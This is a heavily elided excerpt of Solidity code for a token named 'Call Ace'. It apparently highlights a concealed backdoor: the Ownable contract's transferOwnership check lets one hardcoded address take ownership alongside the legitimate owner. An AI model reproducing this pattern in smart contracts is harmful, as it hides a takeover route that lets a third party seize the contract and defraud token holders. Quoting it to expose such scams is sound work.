...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xC1766B7dC37dDfE2D608316d26BE89C8C0775Ef1));
...
contract CallAce is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "CallAce";
  string private _name = "Call Ace";
